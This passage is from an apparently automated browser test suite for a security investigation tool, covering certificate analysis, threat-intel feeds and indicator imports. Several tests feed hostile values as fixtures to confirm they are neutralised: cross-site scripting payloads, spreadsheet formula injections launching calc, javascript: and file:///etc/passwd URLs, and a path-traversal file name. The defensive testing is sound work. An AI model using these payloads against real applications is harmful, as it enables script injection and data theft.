  expect(await page.evaluate(() => { const r = DB.records.find(x => x.tags.includes('authenticode')); return r && r.title; })).toBe('Signed program: signed.exe (Fabrikam Tools Ltd)');
  // one changed byte after signing is caught
  [fc] = await Promise.all([page.waitForEvent('filechooser'), page.click('[data-act=cxFile]')]); await fc.setFiles(path.join(D, 'signed-tampered.exe'));
  await expect(page.locator('.crt-pe')).toContainText('The file was changed after signing');
  // does it cover a host, was it valid on a date
  await page.evaluate(() => CX_ACTS.cxSample(null, 'phish')); await expect(page.locator('.crt-fp code').first()).toContainText(':');
  await page.fill('#cxHost', 'https://www.secure-acme-login.com/login'); await expect(page.locator('#cxHostR')).toContainText('Yes');
  await page.fill('#cxHost', 'a.b.secure-acme-login.com'); await expect(page.locator('#cxHostR')).toContainText('No');
  await page.fill('#cxWhen', '2020-01-01T09:00'); await expect(page.locator('#cxWhenR')).toContainText('not valid yet');
  // hunting queries and exports
  const sha1 = await page.evaluate(() => cxCur().fp.sha1.match(/../g).join(':'));
  await expect(page.locator('.crt-hq')).toContainText('tls.cert_fingerprint; content:"' + sha1 + '"');
  await page.click('[data-act=cxExport]'); const [dl] = await Promise.all([page.waitForEvent('download'), page.click('#ctx .ctx-it:has-text("JSON")')]);
  const J = JSON.parse(fs.readFileSync(await dl.path(), 'utf8')); expect(J.names.length).toBe(6); expect(J.findings.some(f => f.title === 'Lookalike name')).toBe(true);
  expect(await page.evaluate(() => cxText(cxCur()))).toContain('X509v3 extensions:');
  // the investigation side: an assessment, indicators with pivots, records in the cases that already mention them, and adding them to the graph
  await expect(page.locator('.crt-as h2')).toHaveText('Looks like attacker infrastructure');
  await expect(page.locator('#cxInd')).toContainText('185.220.101.47'); await expect(page.locator('#cxInd a', { hasText: 'AbuseIPDB' })).toHaveAttribute('href', /185\.220\.101\.47/);
  await page.evaluate(() => { const body = 'Proxy: user opened https://files-acme.net/invoice.pdf'; DB.records.push({ id: uid('r'), caseId: DB.active, type: 'evidence', title: 'Proxy log — invoice link', body, ts: Date.now(), source: 'proxy', tags: [], ents: extractRich(body), addedAt: Date.now(), att: [] }); cxPaint(); });
  await expect(page.locator('#cxSeen')).toContainText('Proxy log — invoice link'); await expect(page.locator('#cxInd')).toContainText('In 1 record');
  await page.click('[data-act=cxIndAll]'); await page.click('[data-act=cxIndGraph]');
  expect(await page.evaluate(() => DB.entries.filter(e => e.tags.includes('certificate')).map(e => Object.values(e.fields)[0]))).toContain('files-acme.net');
  // two certificates sharing one key: flagged, and compared side by side
  await pasteCert(page, fs.readFileSync(path.join(D, 'reuse-a.pem'), 'utf8'));
  await expect(page.locator('.crt-fp code').first()).toContainText(':'); await page.click('.crt-hero [data-act=cxSave]');
  await pasteCert(page, fs.readFileSync(path.join(D, 'reuse-b.pem'), 'utf8'));
  await expect(page.locator('.crt-hero')).toContainText('Key shared with 1'); await expect(page.locator('.crt-r')).toContainText('Key shared with 1 other certificate');
  await page.click('[data-act=cxCmpWith]');
  await expect(page.locator('.crt-verdict h2')).toContainText('Same owner'); await expect(page.locator('.crt-n3')).toContainText('update-cdn.example');
  await page.click('[data-act=cxPaste][data-v=cmp]'); await page.fill('#cxPdIn', fs.readFileSync(path.join(D, 'ov-ecdsa.pem'), 'utf8')); await page.click('[data-act=cxPdGo]');
  await expect(page.locator('#cxCmpB option:checked')).toContainText('portal.acme.example'); await expect(page.locator('.crt-verdict')).toContainText('Different keys');
  // Certificate Transparency: crt.sh JSON pasted in the dialog
  await page.click('[data-act=cxTab][data-v=ct]'); await page.click('[data-act=cxPaste][data-v=ct]');
  await page.fill('#cxPdIn', fs.readFileSync(path.join(__dirname, 'fixtures', 'crtsh-northwind.json'), 'utf8')); await page.click('[data-act=cxPdGo]');
  await expect(page.locator('.crt-cth h1')).toHaveText('northwind-traders.example');
  await expect(page.locator('.crt-st').first()).toContainText('23');
  await page.fill('#cxCtF', 'vpn'); await expect(page.locator('.crt-ctt tbody tr')).toHaveCount(1);
  await page.fill('#cxCtF', ''); await page.click('[data-act=cxCtK][data-v=hot]'); expect(await page.locator('.crt-ctt tbody tr').count()).toBeGreaterThan(5);
  await page.click('[data-act=cxCtSort][data-v=name]'); await expect(page.locator('.crt-ctt thead th').first()).toHaveAttribute('aria-sort', 'ascending');
  await page.click('[data-act=cxCtSave]');
  expect(await page.evaluate(() => JSON.stringify(DB.records.find(x => x.source === 'ct-log').ents))).toContain('vpn.northwind-traders.example');
  // paste anywhere on the page, and drop a file anywhere
  await page.click('[data-act=cxTab][data-v=decoder]'); await page.evaluate(() => document.activeElement.blur());
  await page.evaluate(pem => { const dt = new DataTransfer(); dt.setData('text/plain', pem); document.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true })); }, fs.readFileSync(path.join(D, 'cobaltstrike-default.pem'), 'utf8'));
  await expect(page.locator('.crt-r')).toContainText('Cobalt Strike default certificate');
  await page.evaluate(b64 => { const dt = new DataTransfer(); dt.items.add(new File([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], 'leaf.der')); document.querySelector('.crt-c').dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true })); }, fs.readFileSync(path.join(D, 'leaf-phish.der')).toString('base64'));
  await expect(page.locator('.crt-hero h1')).toHaveText('secure-acme-login.com');
  noErrors(errors);
});

test('certificates: hostile names, fields and crt.sh results stay text; exported CSV cannot run formulas; key files are refused', async ({ page }) => {
  const fs = require('fs'), path = require('path'), D = path.join(__dirname, 'fixtures', 'certs');
  const errors = await open(page, '#/certs'); let dialogs = 0; page.on('dialog', d => { dialogs++; d.dismiss(); });
  await pasteCert(page, fs.readFileSync(path.join(D, 'hostile.pem'), 'utf8'));
  await expect(page.locator('.crt-hero h1')).toContainText('<img src=x');
  await expect(page.locator('#cxInd')).toContainText('<svg/onload');
  for (const t of ['decoder', 'chain', 'compare']) { await page.click(`[data-act=cxTab][data-v=${t}]`); await page.waitForTimeout(150); }
  await page.click('[data-act=cxTab][data-v=decoder]'); await page.click('.crt-hero [data-act=cxSave]');
  const hostile = JSON.stringify([{ issuer_ca_id: 1, issuer_name: 'C=US, O=<b onmouseover=window.__pwned=5>x</b>, CN=<script>window.__pwned=6</script>', common_name: '=cmd|"/c calc"!A1', name_value: '<img src=y onerror=window.__pwned=7>.evil.test\n=cmd|"/c calc"!A1', id: 1, entry_timestamp: '2026-01-01T00:00:00', not_before: '2026-01-01T00:00:00', not_after: '2027-01-01T00:00:00', serial_number: '01' }]);
  await page.click('[data-act=cxTab][data-v=ct]'); await page.click('[data-act=cxPaste][data-v=ct]'); await page.fill('#cxPdIn', hostile); await page.click('[data-act=cxPdGo]');
  await expect(page.locator('.crt-ctt')).toContainText('<img src=y');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.click('[data-act=cxCtCsv]')]);
  const csv = fs.readFileSync(await dl.path(), 'utf8'); expect(csv).toContain(`"'=cmd|""/c calc""!a1"`); expect(csv).not.toMatch(/(^|\n)=cmd/);
  expect(await page.evaluate(() => ({ p: window.__pwned, img: document.querySelectorAll('.crtw img, .crtw svg[onload], .crtw script, .crtw [onerror], .crtw [onmouseover]').length, js: [...document.querySelectorAll('.crtw a')].some(a => /^javascript:/i.test(a.getAttribute('href') || '')) }))).toEqual({ p: undefined, img: 0, js: false });
  expect(dialogs).toBe(0);
  // private key bundles are refused before anything is read
  await page.click('[data-act=cxTab][data-v=decoder]');
  const [fc] = await Promise.all([page.waitForEvent('filechooser'), page.click('.crt-inb [data-act=cxFile]')]); await fc.setFiles({ name: 'server.pfx', mimeType: 'application/x-pkcs12', buffer: Buffer.from([0x30, 0x82, 0x01, 0x00]) });
  await expect(page.locator('.crt-key')).toContainText('private key');
  noErrors(errors);
});

test('certificates: every type is recognised, explained in the guide, and its example opens', async ({ page }) => {
  const errors = await open(page, '#/certs');
  const want = { ov: 'server', client: 'client', device: 'device', clientca: 'ca', pe: 'code', smime: 'smime', adcs: 'smartcard', docsign: 'docsign', tsa: 'tsa' };
  for (const [k, kind] of Object.entries(want)) {
    await page.evaluate(k => CX_ACTS.cxSample(null, k), k); await expect(page.locator('.crt-kind')).toHaveAttribute('data-v', kind);
    await page.click('.crt-kind'); await expect(page.locator('.crt-art h1')).toHaveText('Types of certificates and what they are for');
    await expect(page.locator('#crtg-ty-' + kind)).toBeInViewport();
    await page.click(`#crtg-ty-${kind} [data-act=cxSample]`); await expect(page.locator('.crt-hero h1, .crt-node').first()).toBeVisible();
  }
  // the client-issuing CA is narrowed by extended key usage and name constraints, and its chain verifies
  await page.evaluate(() => CX_ACTS.cxSample(null, 'clientca')); await expect(page.locator('.crt-ext')).toContainText('Name constraints');
  await page.click('[data-act=cxTab][data-v=chain]'); await expect(page.locator('.crt-lnk.ok')).toHaveCount(2);
  expect(await page.evaluate(() => location.hash)).toBe('#/certs');
  noErrors(errors);
});

test('certificates from a TLS 1.2 capture open in the decoder', async ({ page }) => {
  const fs = require('fs'), path = require('path');
  const errors = await open(page, '#/lab');
  const b64 = fs.readFileSync(path.join(__dirname, 'fixtures', 'tls12-cert.pcap')).toString('base64');
  const tls = await page.evaluate(async b64 => { const A = await pcapAnalyse(new File([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], 'tls12-cert.pcap')); UI.pcap = A; UI.labTab = 'pcap'; UI.pcTab = 'tls'; renderMain(); return A.tls.map(t => [t.sni, t.ver, t.certs.length]); }, b64);
  expect(tls).toEqual([['shop.acme.example', 'TLS 1.2', 1]]);
  await page.click('[data-act=pcCerts]');
  await expect(page.locator('.crt-hero h1')).toHaveText('shop.acme.example');
  await expect(page.locator('.crt-chips')).toContainText('pay.acme.example');
  noErrors(errors);
});

test('nothing is lost on refresh: certificates, decoder, cloud and Lab files come back, and each can be deleted on its own', async ({ page }) => {
  const errors = await open(page, '#/certs');
  const reboot = async hash => { await expect.poll(() => page.evaluate(() => !isDirty())).toBe(true); await page.reload(); await expect.poll(() => page.evaluate(() => typeof DB !== 'undefined' && !!DB && !!document.querySelector('#sidenav .nv')), { timeout: 15000 }).toBe(true); await page.evaluate(h => { location.hash = h; }, hash); };
  // a certificate pasted with its private key: the certificate is kept, the key never is
  const key = '-----BEGIN PRIVATE KEY-----\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAq7BFUpkGp3+LQmlQ\n-----END PRIVATE KEY-----\n';
  await page.evaluate(k => cxIngest(k + CERT_SAMPLES.client.pem), key);
  await expect(page.locator('.crt-src b')).toContainText('Dana Whitfield');
  await expect.poll(() => page.evaluate(() => (DB.recent || []).filter(x => x.tool === 'certs').length)).toBe(1);
  expect(await page.evaluate(() => DB.recent.some(x => /PRIVATE KEY/.test(x.text || '')))).toBe(false);
  // decoder input, a cloud scan, a Lab file
  await page.evaluate(() => { location.hash = '#/decoder'; }); await page.fill('#decIn', 'aGVsbG8gd29ybGQ=');
  await page.evaluate(() => { location.hash = '#/cloud'; cloudRunScan(CLOUD_SAMPLES[Object.keys(CLOUD_SAMPLES).find(k => !/CloudTrail/.test(k))], 'my-policy.json'); });
  await page.evaluate(() => { UI.labTab = 'file'; location.hash = '#/lab'; });
  await page.setInputFiles('#labIn', { name: 'note.txt', mimeType: 'text/plain', buffer: Buffer.from('hello flag{abc}') });
  await expect(page.locator('[data-act=labClear]')).toBeVisible();
  await expect.poll(() => page.evaluate(() => DB.recent.map(x => x.tool).sort().join())).toBe('certs,cloudScan,labFile');
  await reboot('#/certs');
  await expect(page.locator('.crt-src b')).toContainText('Dana Whitfield');                         // the certificate is back
  await page.evaluate(() => { location.hash = '#/decoder'; }); await expect(page.locator('#decIn')).toHaveValue('aGVsbG8gd29ybGQ=');
  await page.evaluate(() => { location.hash = '#/cloud'; }); await expect.poll(() => page.evaluate(() => UI.cloudScan && UI.cloudScan.name)).toBe('my-policy.json');
  await page.evaluate(() => { location.hash = '#/lab'; }); await expect.poll(() => page.evaluate(() => UI.labFile && UI.labFile.name)).toBe('note.txt');
  // History: delete one item; the one on screen closes, the others stay
  await page.evaluate(() => { location.hash = '#/certs'; }); await page.click('[data-act=cxSaved]');
  await expect(page.locator('.rc-r')).toHaveCount(1); await page.click('.rc-r .rc-d');
  await expect(page.locator('.rc-none').first()).toBeVisible(); await page.click('.rc [data-act=dclose] >> nth=-1');
  await expect(page.locator('.crt-src b')).toContainText('Nothing open');
  expect(await page.evaluate(() => DB.recent.map(x => x.tool).sort().join())).toBe('cloudScan,labFile');
  // Settings → Storage lists every recent input; delete the Lab file from there
  await page.evaluate(() => recentDlg('*')); await expect(page.locator('.rc-r')).toHaveCount(2);
  await page.click('.rc-r:has-text("note.txt") .rc-d'); await expect(page.locator('.rc-r')).toHaveCount(1);
  await expect.poll(() => page.evaluate(async () => (await IDB.keys()).filter(k => String(k).startsWith('wk:')).length)).toBe(0);  // its stored copy is gone too (no restore point needs it)
  // restore points and recent searches can be removed one by one
  await page.keyboard.press('Escape'); await page.evaluate(() => { DB.prefs.recentQ = ['alpha', 'beta']; });
  await page.keyboard.press('Control+k'); await page.click('[data-act=srForget][data-v=alpha]');
  expect(await page.evaluate(() => DB.prefs.recentQ)).toEqual(['beta']);
  noErrors(errors);
});

test('decompression bombs are stopped and download names are made safe', async ({ page }) => {
  const errors = await open(page, '#/decoder');
  const r = await page.evaluate(async () => {
    const big = new Uint8Array(80 * 1048576);                                                     // 80 MB of zeros compresses to ~80 KB
    const gz = new Uint8Array(await new Response(new Blob([big]).stream().pipeThrough(new CompressionStream('gzip'))).arrayBuffer());
    let stopped = ''; try{ await decompressCapped(gz, 'gzip', 16 * 1048576); }catch(e){ stopped = e.message; }
    const ok = await decompressCapped(gz.slice(), 'gzip');
    return {small:gz.length < 1048576, stopped, okLen:ok.length, names:[safeName('../../evil.sh'), safeName('a‮txt.exe'), safeName('CON'), safeName('')]};
  });
  expect(r.small).toBe(true); expect(r.stopped).toMatch(/decompression bomb/); expect(r.okLen).toBe(80 * 1048576);
  expect(r.names).toEqual(['_.._evil.sh', 'atxt.exe', '_CON', 'download']);
  noErrors(errors);
});

test('threat intel news: stories merge across sources, CVEs/actors/techniques are read, triage, stack alerts and CVE pages', async ({ page }) => {
  const errors = await open(page, '#/feeds'); const outside = [];
  page.on('request', r => { if (!/^(file|data|blob):/.test(r.url())) outside.push(r.url()); });
  await page.click('[data-act=itri][data-v=all]');
  const pan = page.locator('.ti-st:has-text("PAN-OS GlobalProtect zero-day")');
  await expect(pan.locator('.ti-more')).toHaveText('+1 source');                                         // two sources, one story
  await expect(pan.locator('.ti-chip.cve.kev')).toContainText('CVE-2024-3400');                          // known exploited
  await expect(pan.locator('.ti-chip.ttp')).toContainText('T1190');
  const volt = page.locator('.ti-st:has-text("Volt Typhoon pre-positions")');
  await expect(volt.locator('.ti-chip.act')).toHaveText(['Volt Typhoon']);                               // no false "Group 74" → APT28
  // my stack: watching Palo Alto Networks flags the story and the KEV entry
  await page.click('[data-act=itab][data-v=vulns]');
  await page.fill('#ctiStackIn', 'Palo Alto Networks'); await page.click('.ti-sadd button[type=submit]');
  await expect(page.locator('.ti-sv')).toContainText('Palo Alto Networks');
  await expect(page.locator('.ti-tr2:has-text("CVE-2024-3400") .ti-in.s')).toBeVisible();
  await page.click('.ti-tr2:has-text("CVE-2024-3400")');
  await expect(page.locator('.ti-kevbox')).toContainText('Known exploited');
  await page.click('[data-act=ctiCveToCase]');
  expect(await page.evaluate(() => DB.entries.some(e => e.caseId === DB.active && e.type === 'vulnerability' && e.fields.cve === 'CVE-2024-3400'))).toBe(true);
  await page.click('[data-act=itab][data-v=feed]'); await page.click('[data-act=itri][data-v=all]');
  await expect(pan.locator('.ti-alert')).toContainText('exploited vulnerability in your stack');
  // triage: star, then dismiss leaves the inbox; undo brings it back
  await pan.locator('[data-act=ctiStar]').click(); expect(await page.evaluate(() => DB.feed.filter(f => f.star).length)).toBe(2);   // both copies of the story
  await page.click('[data-act=itri][data-v=inbox]'); const n0 = await page.locator('.ti-st').count();
  await page.locator('.ti-st:has-text("QakBot") [data-act=ctiTri][data-v=dismissed]').click();
  await expect(page.locator('.ti-st')).toHaveCount(n0 - 1);
  await page.click('[data-act=itri][data-v=dismissed]'); await expect(page.locator('.ti-st')).toHaveCount(1);
  // filters by an extracted entity
  await page.evaluate(() => CTI_ACTS.ient(null, 'cve:CVE-2024-3400')); await expect(page.locator('.ti-st')).toHaveCount(1); await expect(page.locator('.ti-filt')).toContainText('CVE-2024-3400');
  // refresh with no source switched on asks first — and nothing has gone over the network
  await page.evaluate(() => CTI_ACTS.ient(null, '')); await page.click('[data-act=feedRefresh]'); await expect(page.locator('.ti-dtabs')).toBeVisible();
  expect(outside).toEqual([]);
  // the page may only ever connect to the named, opt-in hosts — never to "any https site"
  const csp = await page.evaluate(() => document.querySelector('meta[http-equiv=Content-Security-Policy]').content.match(/connect-src ([^;]*)/)[1].split(' '));
  expect(csp.every(h => /^https:\/\/[a-z0-9.-]+$/.test(h) || h === 'https://*.workers.dev')).toBe(true);          // named https hosts; the only wildcard is your own relay
  expect(csp).not.toContain('https:'); expect(csp).not.toContain('*');
  expect(await page.evaluate(() => CTI_SOURCES.every(s => !s.url || s.relay || document.querySelector('meta[http-equiv=Content-Security-Policy]').content.includes(new URL(s.url).origin)))).toBe(true);
  expect(await page.evaluate(() => LK_PROVIDERS.filter(p => p.via !== 'relay').every(p => document.querySelector('meta[http-equiv=Content-Security-Policy]').content.includes('https://' + p.host)))).toBe(true);
  noErrors(errors);
});

test('threat intel indicators: STIX, MISP, CSV and ThreatFox imports are validated, hostile values dropped, exports round-trip, hits in cases', async ({ page }) => {
  const errors = await open(page, '#/feeds');
  const r = await page.evaluate(async () => {
    const stix = {type:'bundle', id:'bundle--1', objects:[
      {type:'marking-definition', id:'marking-definition--5e57c739-391a-4eb3-b6be-7d15ca92d5ed', definition_type:'tlp', definition:{tlp:'red'}},
      {type:'malware', id:'malware--1', name:'Lamp loader', is_family:true},
      {type:'indicator', id:'indicator--1', spec_version:'2.1', created:'2026-09-01T00:00:00Z', modified:'2026-09-02T00:00:00Z', valid_from:'2026-09-01T00:00:00Z', valid_until:'2030-01-01T00:00:00Z', confidence:85,
       pattern:"[ipv4-addr:value = '203.0.113.47'] OR [url:value = 'javascript:alert(1)'] OR [domain-name:value = '<img src=x onerror=alert(1)>']", pattern_type:'stix', object_marking_refs:['marking-definition--5e57c739-391a-4eb3-b6be-7d15ca92d5ed']},
      {type:'relationship', id:'relationship--1', relationship_type:'indicates', source_ref:'indicator--1', target_ref:'malware--1'},
      {type:'indicator', id:'indicator--2', pattern:"[file:hashes.'SHA-256' = '9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a']", pattern_type:'stix', valid_from:'2026-09-01T00:00:00Z'},
      {type:'indicator', id:'indicator--3', pattern:"[domain-name:value = 'it\\'s.bad']", pattern_type:'stix', valid_from:'2026-09-01T00:00:00Z'}]};
    const a = await ctiImportText(JSON.stringify(stix), 'Partner ISAC');
    const misp = {Event:{info:'Phish kit', Tag:[{name:'tlp:amber'}], Attribute:[{type:'domain', value:'update-lamp.test', to_ids:true}, {type:'filename|md5', value:'invoice.lnk|d41d8cd98f00b204e9800998ecf8427e'}, {type:'ip-dst|port', value:'198.51.100.9|8443'}, {type:'text', value:'ignore me'}, {type:'url', value:'file:///etc/passwd'}]}};
    const b = await ctiImportText(JSON.stringify(misp), '');
    const c = await ctiImportText('value,type,tags\n=cmd|\' /C calc\'!A0,url,x\nhttps://evil.example/payload.exe,url,"dropper,=HYPERLINK(1)"\n192.0.2.300,ip,bad-ip', 'CSV feed');
    const d = await ctiImportText(JSON.stringify({query_status:'ok', data:[{ioc_value:'203.0.113.99:4444', ioc_type:'ip:port', malware_printable:'Cobalt Strike', threat_type:'botnet_cc', confidence_level:100, first_seen_utc:'2026-09-03 10:00:00 UTC', tags:['CobaltStrike']}]}), 'ThreatFox', {fmt:'threatfox'});
    const vals = CTI.iocs.map(x => x.v);
    const stixOut = ctiStix(CTI.iocs, 'test', 'amber'), back = ctiParse(JSON.stringify(stixOut));
    const csv = ctiCsv(CTI.iocs);
    return {a, b, c, d, vals, kinds:CTI.iocs.map(x => x.k + ':' + x.tlp), lamp:CTI.iocs.find(x => x.v === '203.0.113.47'), back:back.items.map(x => x.v).sort(), csv,
      nav:JSON.stringify(stixOut).includes('javascript')};
  });
  expect(r.a.fmt).toBe('STIX 2.1'); expect(r.b.fmt).toBe('MISP'); expect(r.c.fmt).toBe('CSV'); expect(r.d.fmt).toBe('ThreatFox JSON');
  expect(r.vals.some(v => /javascript:|<img|file:|=cmd|192\.0\.2\.300/i.test(v))).toBe(false);          // hostile and invalid values never get in
  expect(r.vals).toEqual(expect.arrayContaining(['203.0.113.47', 'update-lamp.test', 'd41d8cd98f00b204e9800998ecf8427e', '198.51.100.9', 'https://evil.example/payload.exe', '203.0.113.99:4444']));
  expect(r.lamp.tlp).toBe('red'); expect(r.lamp.conf).toBe(85); expect(r.lamp.tags).toContain('Lamp loader');
  expect(r.back).toEqual(expect.arrayContaining(['203.0.113.47', 'update-lamp.test', 'https://evil.example/payload.exe']));   // STIX export reads back
  expect(r.csv).not.toMatch(/\n=|,=HYPERLINK/); expect(r.nav).toBe(false);
  // the store is shown, and the indicator also seen in a case is flagged — in Threat Intel and in the case
  await page.click('[data-act=itab][data-v=iocs]');
  await expect(page.locator('.ti-tr3.hit:has-text("203.0.113.47")')).toBeVisible();
  await page.click('.ti-tr3.hit:has-text("203.0.113.47") [data-act=ctiIocCase]'); await expect(page.locator('#insp')).toContainText('In your feeds');
  // it survives a reload
  await page.reload(); await expect.poll(() => page.evaluate(async () => { await ctiLoad(); return CTI.iocs.length; })).toBeGreaterThan(5);
  // delete one, then export the shown set as MISP
  await page.evaluate(() => { UI.itab = 'iocs'; renderMain(); });
  const before = await page.evaluate(() => CTI.iocs.length);
  await page.locator('.ti-tr3:has-text("update-lamp.test") [data-act=ctiIocDel]').click();
  await expect.poll(() => page.evaluate(() => CTI.iocs.length)).toBe(before - 1);
  await page.click('[data-act=ctiExport]'); await page.selectOption('#ctiExFmt', 'misp');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.click('[data-act=ctiExportGo]')]);
  const m = JSON.parse(require('fs').readFileSync(await dl.path(), 'utf8'));
  expect(m.Event.Attribute.length).toBe(before - 1); expect(m.Event.Tag[0].name).toBe('tlp:amber');
  noErrors(errors);
});

test('threat intel actors, ATT&CK and briefs: actor pages, Navigator layer, brief to Notebook and Markdown', async ({ page }) => {
  const errors = await open(page, '#/feeds');
  await page.click('[data-act=itab][data-v=attack]');
  await page.fill('#aq', 'volt'); await page.click('.ti-al-i:has-text("Volt Typhoon")');
  await expect(page.locator('.ti-actor-h h2')).toHaveText('Volt Typhoon');
  await expect(page.locator('.ti-mx-t').first()).toBeVisible();
  const [nav] = await Promise.all([page.waitForEvent('download'), page.click('[data-act=ctiNav]')]);
  const layer = JSON.parse(require('fs').readFileSync(await nav.path(), 'utf8'));
  expect(layer.domain).toBe('enterprise-attack'); expect(layer.techniques.map(t => t.techniqueID)).toContain('T1003.003');
  // brief: star a story, widen the period, save to the Notebook and download Markdown
  await page.evaluate(() => { DB.feed.find(f => f.id === 'f4').star = true; UI.itab = 'brief'; UI.bdays = 3650; renderMain(); });
  await expect(page.locator('.ti-bp')).toContainText('PAN-OS GlobalProtect zero-day');
  const [md] = await Promise.all([page.waitForEvent('download'), page.click('[data-act=ctiBriefMd]')]);
  const text = require('fs').readFileSync(await md.path(), 'utf8');
  expect(text).toMatch(/^# Threat brief/); expect(text).toContain('TLP:GREEN'); expect(text).toContain('CVE-2024-3400 (exploited)');
  await page.click('[data-act=ctiBriefNb]');
  await expect(page).toHaveURL(/#\/notebook/);
  expect(await page.evaluate(() => { const p = DB.nb.pages.find(x => /^Threat brief/.test(x.title)); return p && /PAN-OS/.test(p.html) && !/<script/i.test(p.html); })).toBe(true);
  noErrors(errors);
});

test('threat intel live sources (services faked): only switched-on sources are called, KEV/EPSS/CVE.org, ThreatFox through the relay and news are read correctly', async ({ page }) => {
  const errors = await open(page, '#/feeds'); const hits = [];
  const cors = { 'access-control-allow-origin': '*', 'content-type': 'application/json' };
  await page.route('https://raw.githubusercontent.com/mitre/**', r => { hits.push('attack'); const T = Array.from({ length: 120 }, (_, i) => ({ type: 'attack-pattern', id: 'attack-pattern--' + i, name: 'Tech ' + i, external_references: [{ source_name: 'mitre-attack', external_id: 'T' + (1000 + i) }], kill_chain_phases: [{ kill_chain_name: 'mitre-attack', phase_name: 'execution' }] }));
    r.fulfill({ headers: cors, body: JSON.stringify({ type: 'bundle', objects: [{ type: 'x-mitre-matrix', modified: '2099-02-02T00:00:00Z', tactic_refs: ['x-mitre-tactic--1'] }, { type: 'x-mitre-tactic', id: 'x-mitre-tactic--1', name: 'Execution', x_mitre_shortname: 'execution', external_references: [{ source_name: 'mitre-attack', external_id: 'TA0002' }] }, ...T,
      { type: 'intrusion-set', id: 'intrusion-set--1', name: 'Zebra <b>Panda</b>', aliases: ['Zebra <b>Panda</b>', 'ZP-99'], description: 'A test group that does things. More text here.', external_references: [{ source_name: 'mitre-attack', external_id: 'G9999' }] },
      { type: 'relationship', relationship_type: 'uses', source_ref: 'intrusion-set--1', target_ref: 'attack-pattern--3' }] }) }); });
  await page.route('https://raw.githubusercontent.com/cisagov/**', r => { hits.push('kev'); r.fulfill({ headers: cors, body: JSON.stringify({ catalogVersion: '2099.01.01', dateReleased: '2099-01-01T00:00:00Z', count: 2, vulnerabilities: [
    { cveID: 'CVE-2099-0001', vendorProject: 'Palo Alto Networks', product: 'PAN-OS', vulnerabilityName: 'Test <b>bug</b>', dateAdded: '2099-01-01', dueDate: '2099-01-22', knownRansomwareCampaignUse: 'Known', shortDescription: 'x', cwes: ['CWE-77'] },
    { cveID: 'not-a-cve', vendorProject: 'x' }] }) }); });
  await page.route('https://api.first.org/**', r => { hits.push('epss:' + new URL(r.request().url()).searchParams.get('cve')); r.fulfill({ headers: cors, body: JSON.stringify({ status: 'OK', data: [{ cve: 'CVE-2024-3400', epss: '0.95700', percentile: '0.99900' }, { cve: 'CVE-2024-21762', epss: '7', percentile: '0.5' }] }) }); });
  await page.route('https://cveawg.mitre.org/**', r => { hits.push('cveorg'); r.fulfill({ headers: cors, body: JSON.stringify({ cveMetadata: { cveId: 'CVE-2024-3400', datePublished: '2024-04-12T08:15:06.230Z' }, containers: {
    cna: { descriptions: [{ lang: 'en', value: 'A command injection <script>alert(1)</script> in PAN-OS.' }], metrics: [{ cvssV3_1: { version: '3.1', vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', baseScore: 10.0, baseSeverity: 'CRITICAL' } }],
      problemTypes: [{ descriptions: [{ cweId: 'CWE-77' }] }], affected: [{ vendor: 'Palo Alto Networks', product: 'PAN-OS' }] },
    adp: [{ title: 'CISA ADP Vulnrichment', metrics: [{ other: { type: 'ssvc', content: { options: [{ Exploitation: 'active' }, { Automatable: 'yes' }] } } }] }] } }) }); });
  await page.route('https://r.workers.dev/**', r => { const u = new URL(r.request().url()); hits.push('relay:' + u.pathname + ':' + (r.request().headers()['x-relay-token'] || '')); r.fulfill({ headers: cors, body: JSON.stringify({ query_status: 'ok', data: [{ ioc_value: '203.0.113.47:4444', ioc_type: 'ip:port', malware_printable: 'Lamp loader', confidence_level: 90, first_seen_utc: '2026-09-14 08:00:00 UTC' }] }) }); });
  await page.route('https://threatfox.abuse.ch/**', r => { hits.push('direct-abusech'); r.abort(); });
  await page.route('https://api.rss2json.com/**', r => { hits.push('rss'); r.fulfill({ headers: cors, body: JSON.stringify({ status: 'ok', items: [{ title: 'New <img src=x onerror=alert(1)>CVE-2024-3400 exploitation by ZP-99 group', description: '<p>Details <script>alert(1)</script>with 198.51.100.23</p>', link: 'javascript:alert(1)', pubDate: '2026-11-13 10:00:00' }] }) }); });
  // nothing is on: refresh asks instead of fetching
  await page.click('[data-act=feedRefresh]'); await expect(page.locator('.ti-dtabs')).toBeVisible(); expect(hits).toEqual([]);
  // switch on KEV, EPSS, NVD and ThreatFox (with a key), but not the news relay
  await page.click('[data-act=srcTab][data-v=data]');
  for (const id of ['kev', 'epss', 'nvd', 'attack']) await page.check(`[data-act=ctiSrcToggle][data-id=${id}]`);
  await page.click('[data-act=srcTab][data-v=ioc]'); await page.check('[data-act=ctiSrcToggle][data-id=tfx]');
  await page.click('[data-act=srcTab][data-v=look]'); await page.fill('#lkRelayUrl', 'https://r.workers.dev/'); await page.locator('#lkRelayUrl').blur(); await page.fill('#lkRelayTok', 'k3y'); await page.locator('#lkRelayTok').blur();
  await page.click('.dlg [data-act=dclose] >> nth=-1');
  await page.click('[data-act=feedRefresh]');
  await expect.poll(() => page.evaluate(() => intelBusy)).toBe(false);
  expect(hits).toContain('kev'); expect(hits).toContain('relay:/threatfox-export/export/json/recent/:k3y'); expect(hits).not.toContain('direct-abusech'); expect(hits).not.toContain('rss'); expect(hits.some(h => /^epss:/.test(h))).toBe(true);
  const r = await page.evaluate(() => ({ kev: kevOf('CVE-2099-0001'), bad: kevOf('not-a-cve'), meta: CTI.kevMeta, epss: DB.intel.cve['CVE-2024-3400'], bogus: DB.intel.cve['CVE-2024-21762'], tfx: CTI.iocIx.get('hostport:203.0.113.47:4444') }));
  expect(r.kev.ransom).toBe(true); expect(r.bad).toBe(null); expect(r.meta.live).toBe(true);
  expect(r.epss.epss).toBeCloseTo(0.957); expect(r.bogus && r.bogus.epss).toBeFalsy();                // an out-of-range score is ignored
  expect(r.tfx.threat).toBe('Lamp loader');
  // ATT&CK came from MITRE live and replaced the shipped copy: the new group is recognised, its techniques kept
